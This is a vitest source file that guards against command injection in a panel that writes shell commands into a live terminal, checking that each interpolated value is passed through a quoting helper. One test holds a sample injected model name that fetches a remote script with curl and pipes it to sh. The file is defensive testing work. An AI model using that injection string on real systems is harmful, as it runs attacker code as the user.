import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { shellQuote } from "../../lib/agentCommand";

/**
 * BrainstormPanel builds shell commands and writes them straight into a live
 * PTY, where they execute as the user. One of them interpolates `ollamaModel`
 * — free text from Settings, persisted to localStorage — so an unquoted
 * interpolation is a command-injection primitive, and even a benign model name
 * containing a space splits into two arguments.
 *
 * This is a source-level invariant rather than a rendered-component test
 * because the property being protected is about the command string's shape,
 * and the component needs a live PTY, a mermaid runtime and a reachable Ollama
 * endpoint to reach that line at all.
 */

const REPO = resolve(__dirname, "../../..");
const PANEL = readFileSync(resolve(REPO, "src/components/BrainstormPanel.tsx"), "utf8");

/** Every template literal passed to writeToPty, with its interpolations. */
function ptyTemplates(): { template: string; interpolations: string[] }[] {
  return [...PANEL.matchAll(/writeToPty\(\s*`([^`]*)`/g)].map((m) => ({
    template: m[1],
    interpolations: [...m[1].matchAll(/\$\{([^}]*)\}/g)].map((i) => i[1].trim()),
  }));
}

describe("BrainstormPanel PTY commands", () => {
  it("has at least one interpolated command, so this test is not vacuous", () => {
    const interpolated = ptyTemplates().filter((t) => t.interpolations.length > 0);
    expect(interpolated.length).toBeGreaterThan(0);
  });

  it("passes every interpolated value through shellQuote", () => {
    for (const { template, interpolations } of ptyTemplates()) {
      for (const expr of interpolations) {
        expect(
          expr.startsWith("shellQuote("),
          `unquoted interpolation \${${expr}} in writeToPty(\`${template}\`)`
        ).toBe(true);
      }
    }
  });

  it("neutralises a model name carrying a shell metacharacter", () => {
    // What the quoting has to survive: setting the Ollama model to this in
    // Settings and clicking "Chat with Ollama".
    const malicious = "llama3; curl http://x/s.sh | sh";
    expect(`ollama run ${shellQuote(malicious)}`).toBe(
      "ollama run 'llama3; curl http://x/s.sh | sh'"
    );
  });
});
